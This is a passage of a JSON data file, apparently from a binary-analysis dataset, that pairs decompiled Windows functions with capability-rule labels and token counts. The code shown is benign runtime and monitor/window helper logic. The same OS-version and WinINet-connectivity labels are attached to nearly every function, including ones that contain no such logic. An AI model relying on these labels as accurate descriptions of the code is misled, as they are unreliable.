        "decompiled_code": "\nvoid fcn.004237fc(void)\n\n{\n    char cVar1;\n    \n    *0x46141c = sub.kernel32.dll_MulDiv(8, *0x463894, 0x48);\n    *0x46141c = -*0x46141c;\n    if (*(*0x462210 + 0xc) != '\\0') {\n        cVar1 = fcn.004237b8();\n        if (cVar1 == -0x80) {\n            *0x461423 = *0x42385c;\n            *0x461427 = *0x423860;\n            *0x46142b = *0x423864;\n            *0x46142f = *0x423868;\n            *0x46141c = sub.kernel32.dll_MulDiv(9, *0x463894, 0x48);\n            *0x46141c = -*0x46141c;\n            *0x461422 = cVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 224
    },
    "00423944": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423944(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42395c;\n    fcn.0042392c();\n    uStack32 = 0x4239e5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    for (var_8h = *(in_EAX + 4); (var_8h != NULL && ((param_2 != var_8h[2] || (param_1 != var_8h[3]))));\n        var_8h = *var_8h) {\n    }\n    if (var_8h == NULL) {\n        puStack28 = &stack0xfffffffc;\n        puVar1 = fcn.004026bc();\n        *puVar1 = *(in_EAX + 4);\n        uVar2 = fcn.004239f8();\n        puVar1[1] = uVar2;\n        puVar1[2] = param_2;\n        puVar1[3] = param_1;\n        *(in_EAX + 4) = puVar1;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4239ec;\n    uStack32 = 0x4239e4;\n    fcn.00423938();\n    return;\n}\n",
        "token_count": 369
    },
    "00423b70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00423b70(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x4638e8 != 0) {\n        uVar1 = fcn.0041c430();\n        fcn.0041c430(uVar1);\n        iVar2 = fcn.00423944();\n        return *(iVar2 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 93
    },
    "00424174": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00424174(void)\n\n{\n    uint8_t in_AL;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42418a;\n    fcn.00404458();\n    uStack28 = 0x424233;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_AL + 0x463920) == '\\0') {\n        if (*0x46391c == 0) {\n            iVar2 = 0;\n            puStack24 = &stack0xfffffffc;\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            if (((in_AL == 0) && (puStack24 = &stack0xfffffffc,  *0x463928 == '\\0')) &&\n               (puStack24 = &stack0xfffffffc,  *0x463908 = fcn.00424174(),  *0x463928 == '\\0')) {\n                fcn.00403fa8();\n            }\n            uVar1 = fcn.00404468();\n            in_stack_ffffffd8 = *0x46391c;\n            iVar2 = sub.kernel32.dll_GetProcAddress_1(*0x46391c, uVar1);\n        }\n        if ((iVar2 != 0) && (in_AL != 0)) {\n            *0x463928 = '\\x01';\n        }\n        *(in_AL + 0x463920) = 1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    iStack32 = 0x42423a;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 427
    },
    "0042425c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042425c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x463920 == '\\0') {\n        *0x4638f8 = fcn.00424174();\n        (**0x4638f8)(arg_8h);\n    }\n    else {\n        iVar1 = -1;\n        if (arg_8h - 0x4cU < 2) {\n            iVar1 = 0;\n        }\n        else if (arg_8h == 0x4e) {\n            arg_8h = 0;\n        }\n        else if (arg_8h == 0x4f) {\n            arg_8h = 1;\n        }\n        else if (arg_8h - 0x50U < 2) {\n            iVar1 = 1;\n        }\n        if (iVar1 == -1) {\n            sub.user32.dll_GetSystemMetrics(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "004242e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004242e4(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x463922 == '\\0') {\n        *0x463900 = fcn.00424174();\n        uVar1 = (**0x463900)(arg_8h, arg_ch);\n        return uVar1;\n    }\n    if ((arg_ch & 3) == 0) {\n        if (arg_8h[2] < 1) {\n            return 0;\n        }\n        if (arg_8h[3] < 1) {\n            return 0;\n        }\n        iVar2 = (**0x4638f8)(0);\n        if (iVar2 <= *arg_8h) {\n            return 0;\n        }\n        iVar2 = (**0x4638f8)(1);\n        if (iVar2 <= arg_8h[1]) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 233
    },
    "00424374": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424374(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_10h;\n    \n    if (*0x463921 == '\\0') {\n        *0x4638fc = fcn.00424174();\n        uVar1 = (**0x4638fc)(arg_8h, arg_ch);\n    }\n    else if ((arg_ch & 3) == 0) {\n        iVar2 = sub.user32.dll_IsIconic(arg_8h);\n        if (iVar2 == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n        }\n        else {\n            sub.user32.dll_GetWindowPlacement(arg_8h, &var_2ch);\n        }\n        uVar1 = fcn.004242e4(&var_10h, arg_ch);\n    }\n    else {\n        uVar1 = 0x12340042;\n    }\n    return uVar1;\n}\n",
        "token_count": 233
    },
    "0042440c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042440c(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x463923 == '\\0') {\n        *0x463904 = fcn.00424174();\n        uVar1 = (**0x463904)(arg_8h, arg_ch, arg_10h);\n        return uVar1;\n    }\n    if ((arg_10h & 3) == 0) {\n        if (arg_8h < 0) {\n            return 0;\n        }\n        iVar2 = (**0x4638f8)(0);\n        if (iVar2 <= arg_8h) {\n            return 0;\n        }\n        if (arg_ch < 0) {\n            return 0;\n        }\n        iVar2 = (**0x4638f8)(1);\n        if (iVar2 <= arg_ch) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 234
    },
    "004244a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004244a4(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x463924 == '\\0') {\n        *0x463908 = fcn.00424174();\n        uVar1 = (**0x463908)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x4638f8)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x4638f8)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x4b < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x424570);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 395
    },
    "00424578": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424578(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x463925 == '\\0') {\n        *0x46390c = fcn.00424174();\n        uVar1 = (**0x46390c)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x4638f8)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x4638f8)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x4b < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x424644);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 396
    },
    "0042464c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042464c(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x463926 == '\\0') {\n        *0x463910 = fcn.00424174();\n        uVar1 = (**0x463910)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x4638f8)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x4638f8)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x4b < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x424718);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 395
    },
    "00424720": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424720(int32_t arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x463927 == '\\0') {\n        *0x463914 = fcn.00424174();\n        uVar1 = (**0x463914)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = 0;\n        if (arg_10h != NULL) {\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = (**0x4638f8)(0);\n            var_10h = (**0x4638f8)(1);\n            if (arg_8h == 0) {\n                if ((arg_ch != 0) && (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    return 1;\n                }\n            }\n            else {\n                var_ch = sub.gdi32.dll_GetClipBox(arg_8h, &var_2ch);\n                iVar2 = sub.gdi32.dll_GetDCOrgEx(arg_8h, &var_8h);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                sub.user32.dll_OffsetRect(&var_1ch, -var_8h, -var_4h);\n                iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, &var_2ch);\n                if (((iVar2 == 0) || (arg_ch != 0)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    if (var_ch != 1) {\n                        return 0;\n                    }\n                    return 1;\n                }\n            }\n            uVar1 = (*arg_10h)(0x12340042, arg_8h, &var_1ch, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 550
    },
    "004252bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004252bc(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0;\n    uVar5 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    var_10h = 0;\n    iVar4 = 0;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (param_1 != 0) {\n        fcn.00403ffc();\n    }\n    iVar2 = *(*(var_4h + 0x10) + 8);\n    if (0 < iVar2) {\n        if (-1 < iVar2 + -1) {\n            iVar3 = 0;\n            do {\n                iVar1 = fcn.00423f2c();\n                iVar1 = (**(**(iVar1 + 4) + 0x10))();\n                if (0 < iVar1) {\n                    iVar4 = iVar4 + 1;\n                    var_10h = iVar3;\n                }\n                iVar3 = iVar3 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (iVar4 == 0) {\n            var_2ch = fcn.00404468();\n            var_28h._0_1_ = 6;\n            uVar5 = 0;\n            fcn.0040b630(0, &var_2ch);\n            fcn.004039e4();\n        }\n        if (iVar4 == 1) {\n            iVar2 = fcn.00423f2c();\n            (**(**(iVar2 + 4) + 0x20))();\n        }\n        if (1 < iVar4) {\n            var_14h = fcn.00403228();\n            iVar4 = *(*(var_4h + 0x10) + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_1ch = fcn.00423f2c();\n                    iVar2 = (**(**(var_1ch + 4) + 0x10))();\n                    if (0 < iVar2) {\n                        var_18h = (**(**(var_1ch + 4) + 0x14))();\n                        iVar2 = (**(*var_18h + 0x14))();\n                        if (-1 < iVar2 + -1) {\n                            var_ch = 0;\n                            var_24h = iVar2;\n                            do {\n                                (**(*var_18h + 0xc))();\n                                (**(*var_14h + 0x3c))();\n                                var_ch = var_ch + 1;\n                                var_24h = var_24h + -1;\n                            } while (var_24h != 0);\n                        }\n                        fcn.00403258();\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (*(var_4h + 0xc) == 0) {\n                iVar4 = (**(*var_14h + 0x18))();\n                (**(*var_14h + 0xc))();\n                (**(**(iVar4 + 4) + 0x20))();\n            }\n            else {\n                (**(*var_14h + 0x90))();\n                iVar4 = (**(**(var_4h + 0xc) + 0xc))();\n                if (-1 < iVar4) {\n                    iVar4 = (**(*var_14h + 0x18))();\n                    (**(*var_14h + 0xc))();\n                    (**(**(iVar4 + 4) + 0x20))();\n                }\n            }\n            fcn.00403258();\n        }\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.00403fa8();\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 1013
    },
    "004254d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004254d0(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x4255c3;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00403ffc();\n        puVar1 = puStack44;\n    }\n    puStack44 = puVar1;\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040b5f4();\n        fcn.004039e4();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.00423f2c();\n            fcn.00405660();\n            fcn.0040568c();\n            cVar2 = (**(_pe_dos_header + 0x38))();\n            if (cVar2 != '\\0') {\n                fcn.0040568c();\n                (**(_pe_dos_header + 0x3c))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x4255ca;\n    uStack48 = 0x4255ba;\n    fcn.00404a30();\n    uStack48 = 0x4255c2;\n    fcn.00405648();\n    return;\n}\n",
        "token_count": 452
    },
    "004256e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004256e8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x4256fa;\n    fcn.004056bc();\n    uStack20 = 0x425737;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xc) != 0) {\n        puStack16 = &stack0xfffffffc;\n        fcn.00405648();\n    }\n    fcn.00405660();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x42573e;\n    uStack20 = 0x425736;\n    fcn.00405648();\n    return;\n}\n",
        "token_count": 209
    },
    "00425744": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425744(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t in_ECX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42575d;\n    fcn.00404458();\n    uStack28 = 0x4257d9;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (in_ECX != 0) {\n        puStack24 = &stack0xfffffffc;\n        fcn.00403ffc();\n    }\n    iVar1 = arg_ch;\n    if (iVar1 == 1) {\n        fcn.004254d0();\n    }\n    else if (iVar1 == 2) {\n        fcn.00424fe4();\n    }\n    else if (iVar1 == 3) {\n        fcn.00425014();\n    }\n    else {\n        fcn.004251b4(arg_8h, arg_ch);\n        in_stack_ffffffd8 = arg_8h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x4257e0;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 322
    },
    "00424cf8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424cf8(uint param_1, uint *param_2)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack24 = 0x424d6e;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puVar1 = &stack0xfffffffc;\n    if (*0x463934 == 0) {\n        *0x463934 = fcn.00424e10();\n        puVar1 = puStack20;\n    }\n    puStack20 = puVar1;\n    fcn.00424e84();\n    fcn.00405660();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x424d75;\n    uStack24 = 0x424d6d;\n    fcn.00405648();\n    return;\n}\n",
        "token_count": 261
    },
    "00424d7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00424d7c(void)\n\n{\n    uint *in_EAX;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = 0;\n    }\n    if (*0x463934 == 0) {\n        *0x463934 = fcn.00424e10();\n    }\n    fcn.0040568c();\n    return 0;\n}\n",
        "token_count": 86
    },
    "00425014": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00425014(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x4251a6;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*(*(in_EAX + 0x10) + 8) == 1) {\n        puStack44 = 0x425043;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.00423f2c();\n        puStack44 = 0x42504b;\n        cVar2 = (**(**(iVar3 + 4) + 0x18))();\n        if (cVar2 != '\\0') {\n            puStack44 = 0x42505d;\n            iVar3 = fcn.00423f2c();\n            puStack44 = 0x425065;\n            (**(**(iVar3 + 4) + 0x1c))();\n        }\n    }\n    else {\n        if (*(in_EAX + 0xc) != 0) {\n            puStack44 = 0x425080;\n            puStack32 = &stack0xfffffffc;\n            piVar4 = fcn.00403228();\n            uStack48 = 0x425141;\n            uStack52 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffcc;\n            var_ch = *(*(in_EAX + 0x10) + 8);\n            puStack44 = &stack0xfffffffc;\n            puVar1 = &stack0xfffffffc;\n            if (-1 < var_ch + -1) {\n                do {\n                    puStack44 = puVar1;\n                    iVar3 = fcn.00423f2c();\n                    cVar2 = (**(**(iVar3 + 4) + 0x18))();\n                    if (cVar2 != '\\0') {\n                        (**(**(iVar3 + 4) + 0xc))();\n                        (**(*piVar4 + 0x3c))();\n                    }\n                    var_ch = var_ch + -1;\n                    puVar1 = puStack44;\n                } while (var_ch != 0);\n            }\n            iVar3 = (**(*piVar4 + 0x14))();\n            if (iVar3 < 2) {\n                iVar3 = (**(*piVar4 + 0x18))();\n                (**(**(iVar3 + 4) + 0x1c))();\n            }\n            else {\n                (**(*piVar4 + 0x90))();\n                (**(**(in_EAX + 0xc) + 0x10))();\n                iVar3 = (**(*piVar4 + 0x18))();\n                (**(**(iVar3 + 4) + 0x1c))();\n            }\n            *in_FS_OFFSET = uStack52;\n            puStack44 = 0x425190;\n            uStack48 = 0x425140;\n            fcn.00403258();\n            return;\n        }\n        puVar1 = &stack0xfffffffc;\n        if (0 < *(*(in_EAX + 0x10) + 8)) {\n            puStack44 = 0x42515a;\n            iVar3 = fcn.00423f2c();\n            puStack44 = 0x425162;\n            cVar2 = (**(**(iVar3 + 4) + 0x18))();\n            puVar1 = puStack32;\n            if (cVar2 != '\\0') {\n                puStack44 = 0x425170;\n                iVar3 = fcn.00423f2c();\n                puStack44 = 0x425178;\n                (**(**(iVar3 + 4) + 0x1c))();\n                goto code_r0x00425190;\n            }\n        }\n        puStack32 = puVar1;\n        puStack44 = 0x42518b;\n        fcn.0040b5f4();\n        puStack44 = 0x425190;\n        fcn.004039e4();\n    }\ncode_r0x00425190:\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4251ad;\n    uStack36 = 0x4251a5;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 1051
    },
    "004258e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
